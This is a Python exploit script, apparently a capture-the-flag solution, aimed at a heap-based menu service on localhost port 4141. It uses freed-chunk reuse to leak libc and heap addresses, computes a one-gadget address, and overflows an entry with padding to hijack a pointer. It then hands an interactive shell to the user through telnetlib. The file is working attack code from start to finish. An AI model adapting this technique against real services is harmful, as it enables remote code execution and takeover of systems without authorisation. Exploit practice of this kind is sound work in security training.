import socket
import telnetlib

def read_until(s, text):
    buffer = b''
    while len(buffer) < len(text):
        buffer += s.recv(1)
    while buffer[-len(text):] != text:
        buffer += s.recv(1)
    return buffer[:]

def create_entry(s, size, idx):
    s.send('0\n'.encode())
    p = read_until(s, 'Size: '.encode())
    s.send((str(size) + "\n").encode())
    p = read_until(s, 'Index: '.encode())
    s.send((str(idx) + "\n").encode())
    return recv_menu(s)

def read_entry(s, idx):
    s.send('1\n'.encode())
    p = read_until(s, 'Index: '.encode())
    s.send((str(idx) + "\n").encode())
    p = read_until(s, 'Data: '.encode())
    p = read_until(s, '\n'.encode())
    return recv_menu(s), p

def write_entry(s, idx, data):
    s.send('2\n'.encode())
    p = read_until(s, 'Index: '.encode())
    s.send((str(idx) + "\n").encode())
    p = read_until(s, 'Data: '.encode())
    s.send(data + "\n".encode())
    return recv_menu(s)

def delete_entry(s, idx):
    s.send('3\n'.encode())
    p = read_until(s, 'Index: '.encode())
    s.send((str(idx) + "\n").encode())
    return recv_menu(s)

def recv_menu(s):
    res = read_until(s, 'Command: '.encode())
    return res

#context.log_level = "debug"

s = socket.socket()
s.connect(("localhost", 4141))
recv_menu(s)
create_entry(s, 136, 20)
create_entry(s, 16, 21)
delete_entry(s, 20)
create_entry(s, 136, 22)
_, leak = read_entry(s, 22)
leak = leak[:-1]

leak = int.from_bytes(leak, byteorder='little')
magic_gadget = leak - 2964017

print('leak is: {:x}'.format(leak))
print('magic gadget is: {:x}'.format(magic_gadget))


create_entry(s, 16, 23)
create_entry(s, 16, 24)
delete_entry(s, 23)
delete_entry(s, 24)
create_entry(s, 16, 25)
_, leak_heap = read_entry(s, 25)

leak_heap = leak_heap[:-1]

leak_heap = int.from_bytes(leak_heap, byteorder='little')
print('leak_heap is: {:x}'.format(leak_heap))

create_entry(s, 16, 26)
create_entry(s, 16, 27)
read_entry(s, 26)
read_entry(s, 27)
write_entry(s, 26, 'A'.encode() * 128 + (magic_gadget).to_bytes(8, byteorder='little'))
write_entry(s, 26, 'A'.encode() * 96 + (leak_heap + 176).to_bytes(8, byteorder='little'))

s.send('1\n'.encode())
p = read_until(s, 'Index: '.encode())
s.send((str(27) + "\n").encode())
a = s.recv(100)

print('a', a)
t = telnetlib.Telnet()
t.sock = s
t.interact()

